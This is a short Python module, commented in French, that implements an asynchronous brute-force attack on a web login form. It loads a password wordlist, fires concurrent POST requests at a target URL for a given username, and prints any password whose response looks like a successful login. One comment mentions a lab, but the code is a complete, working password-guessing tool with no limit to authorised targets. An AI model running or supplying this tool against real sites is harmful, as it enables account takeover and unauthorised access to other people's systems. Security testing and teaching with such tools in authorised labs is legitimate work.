import asyncio
import aiohttp

async def attempt_login(session, url, username, password, semaphore):
    """Tente une connexion asynchrone avec un couple User/Password"""
    payload = {'username': username, 'password': password}
    
    async with semaphore:
        try:
            # Envoi d'une requête POST
            async with session.post(url, data=payload, timeout=5) as response:
                text = await response.text()
                # Logique simplifiée : si la page change de taille ou répond 200/302 de manière inhabituelle
                # (Dans un vrai lab, on chercherait un mot clé comme "Welcome" ou l'absence de "Invalid")
                if "incorrect" not in text.lower() and response.status in [200, 301, 302]:
                    print(f"[!!!] SUCCÈS POTENTIEL - User: {username} | Pass: {password} (Status: {response.status})")
        except Exception:
            pass

async def async_brute(url, username, wordlist_path, threads):
    print(f"[*] Démarrage du Brute-Force sur {url} pour l'utilisateur '{username}'")
    
    try:
        with open(wordlist_path, 'r', encoding='utf-8') as f:
            passwords = [line.strip() for line in f]
    except FileNotFoundError:
        print("[-] Dictionnaire introuvable.")
        return

    semaphore = asyncio.Semaphore(threads)
    async with aiohttp.ClientSession() as session:
        tasks = [attempt_login(session, url, username, pwd, semaphore) for pwd in passwords]
        await asyncio.gather(*tasks)

def run_brute(args):
    try:
        asyncio.run(async_brute(args.url, args.username, args.wordlist, args.threads))
    except KeyboardInterrupt:
        print("\n[-] Brute-Force annulé.")